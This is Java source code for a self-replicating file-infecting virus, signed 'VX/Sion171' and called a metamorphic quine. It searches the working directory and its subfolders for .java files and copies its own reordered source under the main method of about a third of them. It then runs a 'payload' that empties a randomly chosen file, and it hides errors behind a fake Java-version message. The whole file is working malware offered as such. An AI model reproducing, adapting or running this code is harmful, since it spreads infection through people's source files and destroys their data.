import java.util.*;
import java.nio.*;
import java.io.*;

public class NotInfector
{
  public static void main(String... args)
  {
		/*-1*/try{
			/*0*/boolean debugging=false;
			/*0*/boolean infecting=true;
         /*0*/boolean destroying=true;
			/*3*/for(String i : args)
			/*4*/{
			/*5*/   if(i.equals("-debug"))debugging=true;
			/*5*/   if(i.equals("-noInfect"))infecting=false;
         /*5*/   if(i.equals("-noDestory"))destroying=false;
			/*8*/}
	      /*9*/
			/*10*/if(debugging)System.out.println("Debugging: " + debugging + "\nInfecting: " + infecting + "\nDestroying: " + destroying + "\n");
			/*11*/
     		/*12*/String dir = System.getProperty("user.dir");
			/*13*/File folder = new File(dir);
			/*13*/File[] listOfFiles = folder.listFiles();                          //get file names in currect directory
			/*13*/ArrayList<File> listOfInfectableFiles = new ArrayList<File>(0);
         /*13*/FileWriter fw;
			/*17*/for(File i : listOfFiles)
         /*18*/{
			   /*19*/if(i.getName().substring(i.getName().indexOf(".")+1).equals("java")) //check if files are .java aka "infectable"
			      /*20*/listOfInfectableFiles.add(i);
            /*20*/if(i.isDirectory() && !(i.getName().indexOf("BackupGoat")>-1)){
               /*21*/File[] subList = i.listFiles();
               /*22*/for(File j : subList)
               /*23*/{
                  /*24*/if(j.getName().substring(j.getName().indexOf(".")+1).equals("java"))
                     /*25*/listOfInfectableFiles.add(j);
                  /*26*/if(j.isDirectory()){
                     /*27*/File[] subsubList = j.listFiles();
                     /*28*/for(File k : subsubList)
                     /*29*/{
                        /*30*/if(k.getName().substring(k.getName().indexOf(".")+1).equals("java"))
                           /*31*/listOfInfectableFiles.add(k);
                     /*32*/}
                  /*33*/}
               /*34*/}
            /*35*/}
			/*36*/}
         /*37*/
         /*38*/
         /*39*/if(debugging)System.out.println("\nInfectable files: \n");
         /*40*/			
         /*41*/if(debugging){
         /*42*/for(File i : listOfInfectableFiles)                               //print names of infectable files and their location
				/*43*/{
					/*44*/System.out.println(i.getName() + "\n" + i);
				/*45*/}
			/*46*/}
         /*47*/
			/*48*/if(debugging)System.out.println("\nAll other files: \n");
         /*49*/
			/*50*/if(debugging){																			//print names of all files and their location
				/*51*/for(File i :listOfFiles)
				/*52*/{
					/*53*/System.out.println(i.getName() + "\n" + i);
				/*54*/}
			/*55*/}
			/*56*/
			/*57*/ArrayList<String> lines = new ArrayList<String>(0);
			/*57*/ArrayList<String> tempViral = new ArrayList<String>(0);           //needs to have a temp arraylist to avoid exception
         /*59*/
         /*61*/Class currentClass = new Object(){}.getClass().getEnclosingClass(); //get file and class names from the class
         /*62*/String currentFile = currentClass.getName() + ".java";				//add .java to the class name to get the file name, thanks java
         /*63*/String currentClassName = currentClass.getName();
         /*64*/if(debugging)System.out.println(currentFile + "\n" + currentClassName); //print the host class's name
         /*65*/
         /*66*/BufferedReader read = new BufferedReader(new FileReader(currentFile)); //read the current file to find viral source
         /*67*/boolean foundSource = false;
         /*68*/int check = 0;
         /*69*/tempViral.add("\t\t/*-1*/try {\n");tempViral.add("\t\t\t/*0*/boolean debugging=false;\n");tempViral.add("\t\t\t/*0*/boolean infecting=true;\n\t\t\t/*0*/boolean destroying=true;" + "\n");
         /*69*/String viralLines="";
         /*71*/ArrayList<String> tempLines = new ArrayList<String>(0);
         /*72*/for(String line; (line=read.readLine()) != null;) 
         /*73*/{
            /*74*/if(line.indexOf("String dir = System.getProperty(\"user.dir\");") > -1)
            /*75*/{
               /*76*/foundSource=true;
            /*77*/}
            /*78*/if(foundSource)
            /*79*/{
               /*80*/tempViral.add(new String(line + "\n"));
            /*81*/}
            /*82*/if(line.indexOf("lines = new ArrayList<String>(0); tempLines = new ArrayList<String>(0);") > -1 && line.indexOf("line.indexOf(\"lines") == -1)
            /*83*/{
               /*84*/foundSource=false;
            /*85*/}
            /*86*/check++;
         /*87*/}
         /*88*/
         /*89*/for(int i=tempViral.size()-1; i>0; i--)
         /*90*/{
         /*91*/   if(Integer.parseInt(tempViral.get(i).substring(tempViral.get(i).indexOf("/*")+2,tempViral.get(i).indexOf("*/"))) <=
         /*92*/      Integer.parseInt(tempViral.get(i-1).substring(tempViral.get(i-1).indexOf("/*")+2,tempViral.get(i-1).indexOf("*/"))))
            /*93*/{
               /*94*/Collections.swap(tempViral, i, i-1);      
            /*95*/}
         /*96*/}
         /*97*/
         /*98*/for(String i : tempViral)viralLines+=i;
         /*99*/
        /*100*/viralLines += "\t\t/*162*/}} catch(Exception iHopeYouDontUseThisVar) { System.out.println(iHopeYouDontUseThisVar);}";
		  /*101*/
        /*102*/ 
        /*103*/ 
        /*104*/for(File i : listOfInfectableFiles)                //infect all infectable files in the current directory     
		  /*105*/{
           /*106*/if(((int)(Math.random()*10)>3))continue;        //~1/3 chance of actually going though with infecting a file on the infectable list
           /*107*/if(i.isDirectory())continue;
           /*108*/if(debugging)
           /*108*/{
              /*110*/System.out.println("Infecting: " + i.toString());
           /*111*/}
           /*112*/
			  /*113*/if(infecting){
			     /*114*/read = new BufferedReader(new FileReader(i));   //read contents of files and write to "lines"
				  /*115*/for(String line; (line=read.readLine())  != null;)
				  /*116*/{
				     /*117*/lines.add(line); tempLines.add(line);
				  /*118*/}
              /*119*/for(int j=0; j<lines.size(); j++)
              /*120*/{
                 /*121*/if(lines.get(j).indexOf("String dir = System.getProperty(\"user.dir\");") > -1)
                 /*122*/{
                    /*123*/foundSource = true;
                    /*124*/break;
                 /*125*/}
              /*126*/}
              /*127*/if(foundSource == true){lines = /**/new ArrayList<String>(0)/**/; tempLines /**/= new ArrayList/**/<String>(0);} else {
                 /*128*/tempLines.add(0,"import java.util.*;");
                 /*128*/tempLines.add(0,"import java.nio.*;");
                 /*128*/tempLines.add(0,"import java.io.*;");
                 /*131*/for(int j=0; j<lines.size(); j++)
			        /*132*/{
					     /*133*/if(lines.get(j).indexOf("public static void main(String") > -1) //check if file has a "main" method
					     /*134*/{
						     /*135*/tempLines.add(j+5, viralLines);               //write virus source directly under the main method line
					     /*136*/}
				        /*137*/if(debugging)System.out.println(tempLines.get(j)); //debug tempLines
			        /*138*/}
                 /*139*/fw = new FileWriter(new File(i.toString()));
                 /*140*/for(String j : tempLines)
                 /*141*/{
                    /*142*/fw.write(j + "\n");
                 /*143*/}
				/*144*///Quine - VX/Sion171 2/29/16
            /*145*///Metamorphic Quine - VX/Sion171 6/30/16
            /*146*/fw.close();
				/*147*/}}
				/*148*///payload: overwrites up to some number of random files in the directory that aren't the host file or the original virus file.
	         /*149*/if(destroying){
				   /*150*/for(int j=0; j<1; j++)
				   /*151*/{
				      /*152*/File temp = listOfFiles[(int)(Math.random()*listOfFiles.length)];
				      /*153*/if(temp.getName().indexOf("NotInfector")>-1 || temp.getName().indexOf(currentClassName)>-1 || temp.getName().indexOf("noInfect")>-1)continue;
					   /*154*/if(debugging)System.out.println("Destorying: " + temp.getName() + "!");
					   /*155*/if(infecting){
					      /*156*/fw = new FileWriter(new File(temp.getName()));
					      /*157*/fw.write("");
					      /*158*/fw.close();
					   /*159*/}
				   /*160*/}}               
				/*161*/lines = new ArrayList<String>(0); tempLines = new ArrayList<String>(0);
         /*162*/}} catch(Exception e) {System.out.println("Java version 52 is newer than Java version 51. \n" + e);}
   }
}
